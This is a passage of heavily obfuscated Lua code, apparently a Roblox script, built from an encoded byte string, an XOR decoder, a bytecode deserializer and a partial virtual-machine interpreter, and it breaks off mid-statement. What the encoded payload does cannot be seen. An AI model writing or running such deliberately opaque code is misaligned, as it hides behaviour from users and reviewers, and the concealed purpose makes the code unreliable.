\149\149\151\149\135\149\149\148\149\150\149\149\149\181\149\149\148\149\148\149\151\149\181\149\149\148\149\148\149\156\149\147\149\149\149\149\183\149\148\149\148\149\145\133\149\149\149\183\149\148\149\135\149\149\149\149\148\149\149\149\181\129\149\149\149\149\149\144\149\181\149\149\149\149\149\149\147\149\135\149\149\148\149\148\149\149\149\181\149\149\148\149\148\149\159\149\135\149\149\150\149\158\149\149\149\149\149\149\148\149\150\149\151\149\181\149\149\148\149\148\149\153\149\135\149\149\150\149\148\149\149\149\181\149\149\150\149\150\149\157\149\149\149\149\148\149\150\149\151\149\181\146\149\148\149\148\149\152\149\181\146\149\148\149\148\149\155\149\133\156\149\149\149\146\149\148\149\149\132\149\149\149\148\149\149\149\149\149\149\149\149\182\149\149\149\148\149\149\149\148\149\149\149\148\149\149\149\148\149\149\149\148\149\149\149\148\149\149\149\148\149\149\149\151\149\149\149\151\149\149\149\151\149\149\149\151\149\149\149\151\149\149\149\151\149\149\149\145\149\149\149\145\149\149\149\145\149\149\149\145\149\149\149\145\149\149\149\145\149\149\149\145\149\149\149\144\149\149\149\144\149\149\149\144\149\149\149\144\149\149\149\144\149\149\149\144\149\149\149\144\149\149\149\144\149\149\149\144\149\149\149\144\149\149\149\144\149\149\149\144\149\149\149\144\149\149\149\144\149\149\149\147\149\149\149';local gamepass_lIlIlIllIlIIlIllllIlIlI=(bit or bit32);local gamepass_lllIIIllll=gamepass_lIlIlIllIlIIlIllllIlIlI and gamepass_lIlIlIllIlIIlIllllIlIlI.bxor or function(gamepass_lIlIlIllIlIIlIllllIlIlI,gamepass_llllllIlIIIllI)local gamepass_IlIIIllIIIlllI,gamepass_lllIIIllll,gamepass_IIIIlIllllIlIIlIl=1,0,10 while gamepass_lIlIlIllIlIIlIllllIlIlI>0 and gamepass_llllllIlIIIllI>0 do local gamepass_IIlIIlllIIIlllIIIIll,gamepass_IIIIlIllllIlIIlIl=gamepass_lIlIlIllIlIIlIllllIlIlI%2,gamepass_llllllIlIIIllI%2 if gamepass_IIlIIlllIIIlllIIIIll~=gamepass_IIIIlIllllIlIIlIl then gamepass_lllIIIllll=gamepass_lllIIIllll+gamepass_IlIIIllIIIlllI end gamepass_lIlIlIllIlIIlIllllIlIlI,gamepass_llllllIlIIIllI,gamepass_IlIIIllIIIlllI=(gamepass_lIlIlIllIlIIlIllllIlIlI-gamepass_IIlIIlllIIIlllIIIIll)/2,(gamepass_llllllIlIIIllI-gamepass_IIIIlIllllIlIIlIl)/2,gamepass_IlIIIllIIIlllI*2 end if gamepass_lIlIlIllIlIIlIllllIlIlI<gamepass_llllllIlIIIllI then gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_llllllIlIIIllI end while gamepass_lIlIlIllIlIIlIllllIlIlI>0 do local gamepass_llllllIlIIIllI=gamepass_lIlIlIllIlIIlIllllIlIlI%2 if gamepass_llllllIlIIIllI>0 then gamepass_lllIIIllll=gamepass_lllIIIllll+gamepass_IlIIIllIIIlllI end gamepass_lIlIlIllIlIIlIllllIlIlI,gamepass_IlIIIllIIIlllI=(gamepass_lIlIlIllIlIIlIllllIlIlI-gamepass_llllllIlIIIllI)/2,gamepass_IlIIIllIIIlllI*2 end return gamepass_lllIIIllll end local function gamepass_IlIIIllIIIlllI(gamepass_llllllIlIIIllI,gamepass_lIlIlIllIlIIlIllllIlIlI,gamepass_IlIIIllIIIlllI)if gamepass_IlIIIllIIIlllI then local gamepass_lIlIlIllIlIIlIllllIlIlI=(gamepass_llllllIlIIIllI/2^(gamepass_lIlIlIllIlIIlIllllIlIlI-1))%2^((gamepass_IlIIIllIIIlllI-1)-(gamepass_lIlIlIllIlIIlIllllIlIlI-1)+1);return gamepass_lIlIlIllIlIIlIllllIlIlI-gamepass_lIlIlIllIlIIlIllllIlIlI%1;else local gamepass_lIlIlIllIlIIlIllllIlIlI=2^(gamepass_lIlIlIllIlIIlIllllIlIlI-1);return(gamepass_llllllIlIIIllI%(gamepass_lIlIlIllIlIIlIllllIlIlI+gamepass_lIlIlIllIlIIlIllllIlIlI)>=gamepass_lIlIlIllIlIIlIllllIlIlI)and 1 or 0;end;end;local gamepass_lIlIlIllIlIIlIllllIlIlI=1;local function gamepass_llllllIlIIIllI()local gamepass_IIlIIlllIIIlllIIIIll,gamepass_llllllIlIIIllI,gamepass_IlIIIllIIIlllI,gamepass_IIIIlIllllIlIIlIl=gamepass_lIIlIlIIIllIlll(gamepass_lIlIlIIIllIIllllIlIllIl,gamepass_lIlIlIllIlIIlIllllIlIlI,gamepass_lIlIlIllIlIIlIllllIlIlI+3);gamepass_IIlIIlllIIIlllIIIIll=gamepass_lllIIIllll(gamepass_IIlIIlllIIIlllIIIIll,149)gamepass_llllllIlIIIllI=gamepass_lllIIIllll(gamepass_llllllIlIIIllI,149)gamepass_IlIIIllIIIlllI=gamepass_lllIIIllll(gamepass_IlIIIllIIIlllI,149)gamepass_IIIIlIllllIlIIlIl=gamepass_lllIIIllll(gamepass_IIIIlIllllIlIIlIl,149)gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lIlIlIllIlIIlIllllIlIlI+4;return(gamepass_IIIIlIllllIlIIlIl*16777216)+(gamepass_IlIIIllIIIlllI*65536)+(gamepass_llllllIlIIIllI*256)+gamepass_IIlIIlllIIIlllIIIIll;end;local function gamepass_IIlIIlllIIIlllIIIIll()local gamepass_llllllIlIIIllI=gamepass_lllIIIllll(gamepass_lIIlIlIIIllIlll(gamepass_lIlIlIIIllIIllllIlIllIl,gamepass_lIlIlIllIlIIlIllllIlIlI,gamepass_lIlIlIllIlIIlIllllIlIlI),149);gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lIlIlIllIlIIlIllllIlIlI+1;return gamepass_llllllIlIIIllI;end;local function gamepass_IIIIlIllllIlIIlIl()local gamepass_llllllIlIIIllI,gamepass_IlIIIllIIIlllI=gamepass_lIIlIlIIIllIlll(gamepass_lIlIlIIIllIIllllIlIllIl,gamepass_lIlIlIllIlIIlIllllIlIlI,gamepass_lIlIlIllIlIIlIllllIlIlI+2);gamepass_llllllIlIIIllI=gamepass_lllIIIllll(gamepass_llllllIlIIIllI,149)gamepass_IlIIIllIIIlllI=gamepass_lllIIIllll(gamepass_IlIIIllIIIlllI,149)gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lIlIlIllIlIIlIllllIlIlI+2;return(gamepass_IlIIIllIIIlllI*256)+gamepass_llllllIlIIIllI;end;local function gamepass_IlIIIlIII()local gamepass_lllIIIllll=gamepass_llllllIlIIIllI();local gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_llllllIlIIIllI();local gamepass_IIIIlIllllIlIIlIl=1;local gamepass_lllIIIllll=(gamepass_IlIIIllIIIlllI(gamepass_lIlIlIllIlIIlIllllIlIlI,1,20)*(2^32))+gamepass_lllIIIllll;local gamepass_llllllIlIIIllI=gamepass_IlIIIllIIIlllI(gamepass_lIlIlIllIlIIlIllllIlIlI,21,31);local gamepass_lIlIlIllIlIIlIllllIlIlI=((-1)^gamepass_IlIIIllIIIlllI(gamepass_lIlIlIllIlIIlIllllIlIlI,32));if(gamepass_llllllIlIIIllI==0)then if(gamepass_lllIIIllll==0)then return gamepass_lIlIlIllIlIIlIllllIlIlI*0;else gamepass_llllllIlIIIllI=1;gamepass_IIIIlIllllIlIIlIl=0;end;elseif(gamepass_llllllIlIIIllI==2047)then return(gamepass_lllIIIllll==0)and(gamepass_lIlIlIllIlIIlIllllIlIlI*(1/0))or(gamepass_lIlIlIllIlIIlIllllIlIlI*(0/0));end;return gamepass_IlIlIlllllIllII(gamepass_lIlIlIllIlIIlIllllIlIlI,gamepass_llllllIlIIIllI-1023)*(gamepass_IIIIlIllllIlIIlIl+(gamepass_lllIIIllll/(2^52)));end;local gamepass_IlIlIlllllIllII=gamepass_llllllIlIIIllI;local function gamepass_IllIIIlllIIllII(gamepass_llllllIlIIIllI)local gamepass_IlIIIllIIIlllI;if(not gamepass_llllllIlIIIllI)then gamepass_llllllIlIIIllI=gamepass_IlIlIlllllIllII();if(gamepass_llllllIlIIIllI==0)then return'';end;end;gamepass_IlIIIllIIIlllI=gamepass_llllIllIIIllIllI(gamepass_lIlIlIIIllIIllllIlIllIl,gamepass_lIlIlIllIlIIlIllllIlIlI,gamepass_lIlIlIllIlIIlIllllIlIlI+gamepass_llllllIlIIIllI-1);gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lIlIlIllIlIIlIllllIlIlI+gamepass_llllllIlIIIllI;local gamepass_llllllIlIIIllI={}for gamepass_lIlIlIllIlIIlIllllIlIlI=1,#gamepass_IlIIIllIIIlllI do gamepass_llllllIlIIIllI[gamepass_lIlIlIllIlIIlIllllIlIlI]=gamepass_lIllIlIIIIIIlIIlllIIII(gamepass_lllIIIllll(gamepass_lIIlIlIIIllIlll(gamepass_llllIllIIIllIllI(gamepass_IlIIIllIIIlllI,gamepass_lIlIlIllIlIIlIllllIlIlI,gamepass_lIlIlIllIlIIlIllllIlIlI)),149))end return gamepass_llllllIllIllIl(gamepass_llllllIlIIIllI);end;local gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_llllllIlIIIllI;local function gamepass_lIllIlIIIIIIlIIlllIIII(...)return{...},gamepass_llIllllllIIIIIlII('#',...)end local function gamepass_llllllIllIllIl()local gamepass_IlIlIlllllIllII={};local gamepass_llllIllIIIllIllI={};local gamepass_lIlIlIIIllIIllllIlIllIl={};local gamepass_lIIlIlIIllIIIIIlIIll={[#{"1 + 1 = 111";"1 + 1 = 111";}]=gamepass_llllIllIIIllIllI,[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]=nil,[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{548;851;108;261};}]=gamepass_lIlIlIIIllIIllllIlIllIl,[#{{180;600;541;562};}]=gamepass_IlIlIlllllIllII,};local gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_llllllIlIIIllI()local gamepass_lllIIIllll={}for gamepass_IlIIIllIIIlllI=1,gamepass_lIlIlIllIlIIlIllllIlIlI do local gamepass_llllllIlIIIllI=gamepass_IIlIIlllIIIlllIIIIll();local gamepass_lIlIlIllIlIIlIllllIlIlI;if(gamepass_llllllIlIIIllI==2)then gamepass_lIlIlIllIlIIlIllllIlIlI=(gamepass_IIlIIlllIIIlllIIIIll()~=0);elseif(gamepass_llllllIlIIIllI==3)then gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_IlIIIlIII();elseif(gamepass_llllllIlIIIllI==1)then gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_IllIIIlllIIllII();end;gamepass_lllIIIllll[gamepass_IlIIIllIIIlllI]=gamepass_lIlIlIllIlIIlIllllIlIlI;end;for gamepass_lIIlIlIIllIIIIIlIIll=1,gamepass_llllllIlIIIllI()do local gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_IIlIIlllIIIlllIIIIll();if(gamepass_IlIIIllIIIlllI(gamepass_lIlIlIllIlIIlIllllIlIlI,1,1)==0)then local gamepass_IIlIIlllIIIlllIIIIll=gamepass_IlIIIllIIIlllI(gamepass_lIlIlIllIlIIlIllllIlIlI,2,3);local gamepass_lIIlIlIIIllIlll=gamepass_IlIIIllIIIlllI(gamepass_lIlIlIllIlIIlIllllIlIlI,4,6);local gamepass_lIlIlIllIlIIlIllllIlIlI={gamepass_IIIIlIllllIlIIlIl(),gamepass_IIIIlIllllIlIIlIl(),nil,nil};if(gamepass_IIlIIlllIIIlllIIIIll==0)then gamepass_lIlIlIllIlIIlIllllIlIlI[#("RkR")]=gamepass_IIIIlIllllIlIIlIl();gamepass_lIlIlIllIlIIlIllllIlIlI[#("Txuc")]=gamepass_IIIIlIllllIlIIlIl();elseif(gamepass_IIlIIlllIIIlllIIIIll==1)then gamepass_lIlIlIllIlIIlIllllIlIlI[#("40K")]=gamepass_llllllIlIIIllI();elseif(gamepass_IIlIIlllIIIlllIIIIll==2)then gamepass_lIlIlIllIlIIlIllllIlIlI[#("Rh0")]=gamepass_llllllIlIIIllI()-(2^16)elseif(gamepass_IIlIIlllIIIlllIIIIll==3)then gamepass_lIlIlIllIlIIlIllllIlIlI[#("ESe")]=gamepass_llllllIlIIIllI()-(2^16)gamepass_lIlIlIllIlIIlIllllIlIlI[#{"1 + 1 = 111";{725;758;547;891};"1 + 1 = 111";"1 + 1 = 111";}]=gamepass_IIIIlIllllIlIIlIl();end;if(gamepass_IlIIIllIIIlllI(gamepass_lIIlIlIIIllIlll,1,1)==1)then gamepass_lIlIlIllIlIIlIllllIlIlI[#("q4")]=gamepass_lllIIIllll[gamepass_lIlIlIllIlIIlIllllIlIlI[#("Id")]]end if(gamepass_IlIIIllIIIlllI(gamepass_lIIlIlIIIllIlll,2,2)==1)then gamepass_lIlIlIllIlIIlIllllIlIlI[#("INa")]=gamepass_lllIIIllll[gamepass_lIlIlIllIlIIlIllllIlIlI[#("Rh1")]]end if(gamepass_IlIIIllIIIlllI(gamepass_lIIlIlIIIllIlll,3,3)==1)then gamepass_lIlIlIllIlIIlIllllIlIlI[#("Dacs")]=gamepass_lllIIIllll[gamepass_lIlIlIllIlIIlIllllIlIlI[#{{895;390;459;538};{297;583;626;53};"1 + 1 = 111";{654;8;578;121};}]]end gamepass_IlIlIlllllIllII[gamepass_lIIlIlIIllIIIIIlIIll]=gamepass_lIlIlIllIlIIlIllllIlIlI;end end;gamepass_lIIlIlIIllIIIIIlIIll[3]=gamepass_IIlIIlllIIIlllIIIIll();for gamepass_lIlIlIllIlIIlIllllIlIlI=1,gamepass_llllllIlIIIllI()do gamepass_llllIllIIIllIllI[gamepass_lIlIlIllIlIIlIllllIlIlI-1]=gamepass_llllllIllIllIl();end;for gamepass_lIlIlIllIlIIlIllllIlIlI=1,gamepass_llllllIlIIIllI()do gamepass_lIlIlIIIllIIllllIlIllIl[gamepass_lIlIlIllIlIIlIllllIlIlI]=gamepass_llllllIlIIIllI();end;return gamepass_lIIlIlIIllIIIIIlIIll;end;local gamepass_IlIIIlIII=pcall local function gamepass_IlIlIlllllIllII(gamepass_lIIlIlIIIllIlll,gamepass_lIlIlIllIlIIlIllllIlIlI,gamepass_IIlIIlllIIIlllIIIIll)gamepass_lIIlIlIIIllIlll=(gamepass_lIIlIlIIIllIlll==true and gamepass_llllllIllIllIl())or gamepass_lIIlIlIIIllIlll;return(function(...)local gamepass_llllllIlIIIllI=1;local gamepass_lIlIlIllIlIIlIllllIlIlI=-1;local gamepass_lIlIlIIIllIIllllIlIllIl={...};local gamepass_llllIllIIIllIllI=gamepass_llIllllllIIIIIlII('#',...)-1;local gamepass_lllIIIllll=gamepass_lIIlIlIIIllIlll[#{{954;857;256;245};}];local gamepass_IIIIlIllllIlIIlIl=gamepass_lIIlIlIIIllIlll[#{"1 + 1 = 111";"1 + 1 = 111";{979;966;554;942};}];local gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lIIlIlIIIllIlll[#{"1 + 1 = 111";"1 + 1 = 111";}];local function gamepass_llllllIllIllIl()local gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lIllIlIIIIIIlIIlllIIII local gamepass_lIIlIlIIIllIlll={};local gamepass_lIlIlIllIlIIlIllllIlIlI={};local gamepass_IlIIIllIIIlllI={};for gamepass_lIlIlIllIlIIlIllllIlIlI=0,gamepass_llllIllIIIllIllI do if(gamepass_lIlIlIllIlIIlIllllIlIlI>=gamepass_IIIIlIllllIlIIlIl)then gamepass_lIIlIlIIIllIlll[gamepass_lIlIlIllIlIIlIllllIlIlI-gamepass_IIIIlIllllIlIIlIl]=gamepass_lIlIlIIIllIIllllIlIllIl[gamepass_lIlIlIllIlIIlIllllIlIlI+1];else gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI]=gamepass_lIlIlIIIllIIllllIlIllIl[gamepass_lIlIlIllIlIIlIllllIlIlI+1];end;end;local gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_llllIllIIIllIllI-gamepass_IIIIlIllllIlIIlIl+1 local gamepass_lIlIlIllIlIIlIllllIlIlI;local gamepass_IIIIlIllllIlIIlIl;while true do gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IIIIlIllllIlIIlIl=gamepass_lIlIlIllIlIIlIllllIlIlI[#("o")];if gamepass_IIIIlIllllIlIIlIl<=#("j7rIQsFs41")then if gamepass_IIIIlIllllIlIIlIl<=#("UvyP")then if gamepass_IIIIlIllllIlIIlIl<=#("L")then if gamepass_IIIIlIllllIlIIlIl==#("")then gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("uk")]]=gamepass_IIlIIlllIIIlllIIIIll[gamepass_lIlIlIllIlIIlIllllIlIlI[#("ch9")]];else gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#{"1 + 1 = 111";{996;987;812;275};}]]=gamepass_lIlIlIllIlIIlIllllIlIlI[#("itq")];end;elseif gamepass_IIIIlIllllIlIIlIl<=#("AU")then if(gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#{{707;248;805;597};"1 + 1 = 111";}]]==gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("IHKI")]])then gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;else gamepass_llllllIlIIIllI=gamepass_lIlIlIllIlIIlIllllIlIlI[#("NnR")];end;elseif gamepass_IIIIlIllllIlIIlIl==#("t3S")then gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("yD")]]=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#{{470;189;371;717};{276;824;342;308};"1 + 1 = 111";}]][gamepass_lIlIlIllIlIIlIllllIlIlI[#("KqkY")]];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("kb")]]=gamepass_IIlIIlllIIIlllIIIIll[gamepass_lIlIlIllIlIIlIllllIlIlI[#("5ts")]];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("Wm")]]=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("ogz")]][gamepass_lIlIlIllIlIIlIllllIlIlI[#("d42y")]];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("bc")]]=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("bZ7")]][gamepass_lIlIlIllIlIIlIllllIlIlI[#("MMLk")]];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];if(gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("TW")]]==gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#{{912;909;472;488};{581;412;140;107};{261;815;925;233};"1 + 1 = 111";}]])then gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;else gamepass_llllllIlIIIllI=gamepass_lIlIlIllIlIIlIllllIlIlI[#("OTg")];end;else do return end;end;elseif gamepass_IIIIlIllllIlIIlIl<=#("Ivng1xs")then if gamepass_IIIIlIllllIlIIlIl<=#("X6inK")then gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("9s")]]=gamepass_lIlIlIllIlIIlIllllIlIlI[#("srS")];elseif gamepass_IIIIlIllllIlIIlIl==#("f1MgXB")then gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("9J")]][gamepass_lIlIlIllIlIIlIllllIlIlI[#("0cr")]]=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("rWuk")]];else gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("iO")]]=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("05d")]][gamepass_lIlIlIllIlIIlIllllIlIlI[#{{404;869;308;811};{988;215;225;543};"1 + 1 = 111";"1 + 1 = 111";}]];end;elseif gamepass_IIIIlIllllIlIIlIl<=#("2GATS5jj")then local gamepass_lllIIIllll=gamepass_lIlIlIllIlIIlIllllIlIlI[#("9B")];local gamepass_llllllIlIIIllI=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("aaF")]];gamepass_IlIIIllIIIlllI[gamepass_lllIIIllll+1]=gamepass_llllllIlIIIllI;gamepass_IlIIIllIIIlllI[gamepass_lllIIIllll]=gamepass_llllllIlIIIllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("mWX2")]];elseif gamepass_IIIIlIllllIlIIlIl>#("Nz02VieXa")then local gamepass_llllllIlIIIllI=gamepass_lIlIlIllIlIIlIllllIlIlI[#("ta")]gamepass_IlIIIllIIIlllI[gamepass_llllllIlIIIllI]=gamepass_IlIIIllIIIlllI[gamepass_llllllIlIIIllI](gamepass_lIIlIlIIllIIIIIlIIll(gamepass_IlIIIllIIIlllI,gamepass_llllllIlIIIllI+1,gamepass_lIlIlIllIlIIlIllllIlIlI[#("tX0")]))else gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("FD")]][gamepass_lIlIlIllIlIIlIllllIlIlI[#("ZIk")]]=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("0XTt")]];end;elseif gamepass_IIIIlIllllIlIIlIl<=#("C0KSUxTNt3sngrN")then if gamepass_IIIIlIllllIlIIlIl<=#("ZYyiCixIsUyS")then if gamepass_IIIIlIllllIlIIlIl==#{{915;519;347;448};{379;51;644;840};{550;244;566;757};{961;924;612;395};"1 + 1 = 111";{830;993;986;146};"1 + 1 = 111";"1 + 1 = 111";{593;114;703;23};{228;282;620;257};"1 + 1 = 111";}then gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("4p")]]=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("TfG")]][gamepass_lIlIlIllIlIIlIllllIlIlI[#("IhO9")]];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("S7")]]=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("vTr")]][gamepass_lIlIlIllIlIIlIllllIlIlI[#("tisW")]];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("iF")]]=gamepass_IIlIIlllIIIlllIIIIll[gamepass_lIlIlIllIlIIlIllllIlIlI[#("hiV")]];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("SG")]]=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("iHx")]][gamepass_lIlIlIllIlIIlIllllIlIlI[#("ML7Z")]];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#{"1 + 1 = 111";"1 + 1 = 111";}]][gamepass_lIlIlIllIlIIlIllllIlIlI[#("c5E")]]=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("X6aT")]];else local gamepass_lllIIIllll=gamepass_lIlIlIllIlIIlIllllIlIlI[#("Ty")];local gamepass_llllllIlIIIllI=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("ci3")]];gamepass_IlIIIllIIIlllI[gamepass_lllIIIllll+1]=gamepass_llllllIlIIIllI;gamepass_IlIIIllIIIlllI[gamepass_lllIIIllll]=gamepass_llllllIlIIIllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#{"1 + 1 = 111";{949;882;927;329};"1 + 1 = 111";{423;514;337;165};}]];end;elseif gamepass_IIIIlIllllIlIIlIl<=#("s0q6AsIpfspA1")then gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("Qb")]]=gamepass_IIlIIlllIIIlllIIIIll[gamepass_lIlIlIllIlIIlIllllIlIlI[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];elseif gamepass_IIIIlIllllIlIIlIl==#("tEbza9bHvgEhCt")then gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("Wo")]]=gamepass_IIlIIlllIIIlllIIIIll[gamepass_lIlIlIllIlIIlIllllIlIlI[#("2UU")]];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("Ek")]]=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("hWd")]][gamepass_lIlIlIllIlIIlIllllIlIlI[#("ZZSS")]];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("4C")]]=gamepass_IIlIIlllIIIlllIIIIll[gamepass_lIlIlIllIlIIlIllllIlIlI[#("H8b")]];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("7G")]]=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("Nji")]][gamepass_lIlIlIllIlIIlIllllIlIlI[#("9lLp")]];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("BZ")]]=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("pSI")]][gamepass_lIlIlIllIlIIlIllllIlIlI[#("jiuR")]];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];if(gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("gr")]]==gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("0AB2")]])then gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;else gamepass_llllllIlIIIllI=gamepass_lIlIlIllIlIIlIllllIlIlI[#("B8t")];end;else gamepass_llllllIlIIIllI=gamepass_lIlIlIllIlIIlIllllIlIlI[#("d13")];end;elseif gamepass_IIIIlIllllIlIIlIl<=#("ybicjjrfM3CZCaOGzn")then if gamepass_IIIIlIllllIlIIlIl<=#("O0pzPv7VEkDr0o6R")then gamepass_llllllIlIIIllI=gamepass_lIlIlIllIlIIlIllllIlIlI[#("lF9")];elseif gamepass_IIIIlIllllIlIIlIl==#("hxSHcyAGJjJHSKe3E")then do return end;else local gamepass_llllllIlIIIllI=gamepass_lIlIlIllIlIIlIllllIlIlI[#("k0")]gamepass_IlIIIllIIIlllI[gamepass_llllllIlIIIllI]=gamepass_IlIIIllIIIlllI[gamepass_llllllIlIIIllI](gamepass_lIIlIlIIllIIIIIlIIll(gamepass_IlIIIllIIIlllI,gamepass_llllllIlIIIllI+1,gamepass_lIlIlIllIlIIlIllllIlIlI[#{"1 + 1 = 111";"1 + 1 = 111";{375;108;982;304};}]))end;elseif gamepass_IIIIlIllllIlIIlIl<=#("DhNEQmzX5jLLLGsxzbG")then gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#{"1 + 1 = 111";"1 + 1 = 111";}]]=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("yaQ")]][gamepass_lIlIlIllIlIIlIllllIlIlI[#{"1 + 1 = 111";{42;146;794;389};{948;494;22;952};{319;176;71;357};}]];elseif gamepass_IIIIlIllllIlIIlIl>#("MC02gmynWKyyvJEKONRG")then 